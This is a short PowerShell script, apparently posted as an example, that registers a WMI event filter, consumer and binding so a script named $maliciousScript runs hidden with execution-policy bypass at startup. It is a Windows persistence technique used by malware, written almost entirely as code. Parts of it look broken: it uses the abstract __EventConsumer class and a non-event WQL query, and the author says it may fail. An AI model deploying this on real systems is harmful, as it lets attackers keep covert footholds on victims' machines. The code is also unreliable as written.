#I AM NOT A GREAT PS CODER SO THIS MIGHT FAIL BUT THE EXAMPLE STILL WORKS ::SHRUGS::
# Define the path to where you want the script to execute when triggered by an event
$maliciousScript = "C:\Path\To\LegitScript.ps1"

# Create an Event Filter that triggers on system startup
$filterName = "__EventFilter_StartupTrigger"
$query = "SELECT * FROM Win32_StartupCommand WHERE Command LIKE '%yourcommand%' OR Arguments LIKE '%yourcommand%'"

# Register the event filter
New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property @{ 
    Name=$filterName; 
    EventNameSpace="root\\cimv2"; 
    QueryLanguage="WQL"; 
    Query=$query 
} | Out-Null

# Create an Event Consumer that runs a legit script at startup
$consumerName = "__EventConsumer_StartupScript"
$commandToExecute = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $maliciousScript"

New-CimInstance -Namespace root\subscription -ClassName __EventConsumer -Property @{ 
    Name=$consumerName; 
    ExecutablePath="C:\Windows\System32\cmd.exe"; 
    CommandToExecute=$commandToExecute 
} | Out-Null

# Bind the filter and consumer together
$bindingName = "__FilterToConsumerBinding_Startup"
New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property @{ 
    Filter = (Get-CimInstance -Query "SELECT * FROM __EventFilter WHERE Name='$filterName'"); 
    Consumer = (Get-CimInstance -Query "SELECT * FROM __EventConsumer WHERE Name='$consumerName'") 
} | Out-Null
